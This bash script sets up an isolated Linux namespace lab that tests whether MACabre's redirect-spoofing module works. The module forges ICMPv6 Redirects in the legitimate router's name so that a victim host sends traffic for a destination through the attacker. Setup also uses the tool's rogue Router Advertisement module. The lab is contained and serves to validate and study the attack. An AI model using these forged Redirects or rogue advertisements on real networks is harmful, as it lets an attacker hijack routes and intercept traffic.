#!/usr/bin/env bash
# Isolated redirect spoofing lab (Linux only, needs root and IPv6 in the kernel).
#
# Topology, all inside network namespaces, on one bridge:
#
#   router:   the legitimate router. It advertises LEGIT_PREFIX with a default router lifetime.
#   victim:   a host that accepts RAs and Redirects (default kernel settings). Its default router is the router.
#   attacker: a host that sends forged ICMPv6 Redirect messages with MACabre's module. The Redirects claim to
#             come from the router's link-local address and name the attacker as the next hop for DEST.
#
# Phases:
#   Phase 0 (setup): the router advertises LEGIT_PREFIX. The victim must take the router as its default route.
#            If not, the lab cannot tell anything and exits 2.
#   Phase 1 (control): no Redirect has been sent. The victim's route for DEST must go through the router.
#   Phase 2 (attack): the attacker sends Redirects for DEST. The victim's route for DEST must now go through
#            the attacker's link-local address.
#
# Linux accepts a Redirect only from the router that is the victim's current next hop, and only when the
# new next hop is on the link. This lab meets both. The lab reads the route with `ip -6 route get`, which
# includes the route exception the Redirect creates.
#
# Exit 0 when the control holds and the victim's route for DEST goes through the attacker. Exit 1 when it
# does not. Exit 2 when the setup or control failed.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/redirect_spoofing_lab.sh
#
# Requirements: iproute2 (ip) with IPv6 enabled in the kernel, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

if ! command -v ip >/dev/null 2>&1; then
    echo "Missing required tool: ip" >&2
    exit 1
fi

if [[ ! -e /proc/sys/net/ipv6 ]]; then
    echo "This lab needs IPv6 in the kernel." >&2
    exit 1
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
LEGIT_PREFIX="2001:db8:5000::/64"
LEGIT_MATCH="2001:db8:5000:"
ROUTER_MAC="02:00:00:00:10:01"
ROUTER_LL="fe80::ff:fe00:1001"         # EUI-64 link-local for ROUTER_MAC
VICTIM_MAC="02:00:00:00:10:02"
ATTACKER_MAC="02:00:00:00:10:03"
ATTACKER_LL="fe80::ff:fe00:1003"       # EUI-64 link-local for ATTACKER_MAC
DEST="2001:db8:dead::1"

stop_lab() {
    for ns in lan router victim attacker; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

stop_lab

ip netns add lan
ip netns add router
ip netns add victim
ip netns add attacker

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up

# attach_host NAME NAMESPACE MAC: one veth from the bridge into the namespace.
attach_host() {
    local name="$1" ns="$2" mac="$3"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
    ip netns exec "$ns" ip link set "h-$name" address "$mac"
    ip netns exec "$ns" ip link set "h-$name" up
}

attach_host rtr router "$ROUTER_MAC"
attach_host vic victim "$VICTIM_MAC"
attach_host atk attacker "$ATTACKER_MAC"

LEGIT_CODE='
import sys, threading
from macabre.attacks.rogue_router_advertisement import RogueRouterAdvertisementConfig, run_rogue_router_advertisement
stats = run_rogue_router_advertisement(
    RogueRouterAdvertisementConfig(iface=sys.argv[1], source_mac=sys.argv[2], prefix=sys.argv[3], frames=2),
    threading.Event(), lambda _s: None,
)
print(stats.frames)
'

REDIRECT_CODE='
import sys, threading
from macabre.attacks.redirect_spoofing import RedirectSpoofingConfig, run_redirect_spoofing
stats = run_redirect_spoofing(
    RedirectSpoofingConfig(iface=sys.argv[1], source_mac=sys.argv[2], router_address=sys.argv[3], victim_mac=sys.argv[4], destination=sys.argv[5], frames=3, include_redirected_header=False),
    threading.Event(), lambda _s: None,
)
print(stats.frames)
'

# Prints "yes" when the victim has a default route through ROUTER_LL, otherwise "no".
has_legit_router() {
    if ip netns exec victim ip -6 route show default 2>/dev/null | grep -q "via $ROUTER_LL"; then
        echo yes
    else
        echo no
    fi
}

# Prints the next hop the victim uses for DEST (including any Redirect exception), or "none".
next_hop_for_dest() {
    local line
    line="$(ip netns exec victim ip -6 route get "$DEST" 2>/dev/null | head -n1 || true)"
    if [[ "$line" =~ via\ ([0-9a-f:]+) ]]; then
        echo "${BASH_REMATCH[1]}"
    else
        echo none
    fi
}

# Prints the victim's count of ICMPv6 Redirect messages received (kernel counter Icmp6InRedirects).
redirects_received() {
    ip netns exec victim cat /proc/net/snmp6 2>/dev/null | awk '$1 == "Icmp6InRedirects" {print $2}' || true
}

# Prints the victim's full route lookup for DEST, for diagnosis.
route_for_dest() {
    ip netns exec victim ip -6 route get "$DEST" 2>/dev/null | head -n1 || true
}

# Prints the victim's neighbor entry for the router (state matters: Linux checks the sender of a Redirect).
router_neighbor() {
    ip netns exec victim ip -6 neigh show dev h-vic "$ROUTER_LL" 2>/dev/null | head -n1 || true
}

# Prints "yes" when the victim has a global address inside LEGIT_MATCH, otherwise "no".
has_legit_address() {
    if ip netns exec victim ip -6 addr show dev h-vic scope global 2>/dev/null | grep -q "inet6 $LEGIT_MATCH"; then
        echo yes
    else
        echo no
    fi
}

echo "Phase 0: setup, the legitimate router advertises $LEGIT_PREFIX"
ip netns exec router env PYTHONPATH="$ROOT/src" "$PY" -c "$LEGIT_CODE" h-rtr "$ROUTER_MAC" "$LEGIT_PREFIX" >/dev/null 2>&1 || true
sleep 4
SETUP_ROUTER="$(has_legit_router)"
SETUP_ADDR="$(has_legit_address)"
echo "  default router via $ROUTER_LL: $SETUP_ROUTER"
echo "  address inside $LEGIT_PREFIX: $SETUP_ADDR"
echo "  Redirect acceptance (accept_redirects on the victim): $(ip netns exec victim cat /proc/sys/net/ipv6/conf/h-vic/accept_redirects 2>/dev/null || echo unknown)"
echo

echo "Phase 1: control, no Redirect sent"
BASE_HOP="$(next_hop_for_dest)"
BASE_REDIRECTS="$(redirects_received)"
echo "  victim next hop for $DEST: $BASE_HOP"
echo "  victim Icmp6InRedirects: $BASE_REDIRECTS"
echo "  victim neighbor entry for the router: $(router_neighbor)"
echo

echo "Phase 2: attacker sends Redirects claiming $ROUTER_LL, naming $ATTACKER_LL as the next hop for $DEST, with MACabre's module"
SENT="$(ip netns exec attacker env PYTHONPATH="$ROOT/src" "$PY" -c "$REDIRECT_CODE" h-atk "$ATTACKER_MAC" "$ROUTER_LL" "$VICTIM_MAC" "$DEST" 2>/dev/null || echo 0)"
echo "  redirects sent: $SENT"
sleep 2
AFTER_HOP="$(next_hop_for_dest)"
AFTER_REDIRECTS="$(redirects_received)"
echo "  victim next hop for $DEST: $AFTER_HOP"
echo "  victim Icmp6InRedirects: $AFTER_REDIRECTS (received during the attack: $((AFTER_REDIRECTS - BASE_REDIRECTS)))"
echo "  victim route for $DEST: $(route_for_dest)"
echo "  victim neighbor entry for the router: $(router_neighbor)"
echo

if [[ "$SETUP_ROUTER" != "yes" || "$SETUP_ADDR" != "yes" ]]; then
    echo "Setup: the victim did not take the legitimate router and prefix. Result unreliable."
    exit 2
fi
if [[ "$BASE_HOP" != "$ROUTER_LL" ]]; then
    echo "Control: the victim's next hop for $DEST was not the router before the attack. Result unreliable."
    exit 2
fi
if [[ "$AFTER_HOP" == "$ATTACKER_LL" ]]; then
    echo "Result: the victim now sends traffic for $DEST through the attacker ($ATTACKER_LL). Vulnerable: forged Redirects from the current router change the host's route."
    exit 0
fi
echo "Result: the victim's next hop for $DEST did not change to the attacker (now $AFTER_HOP). Not validated."
exit 1
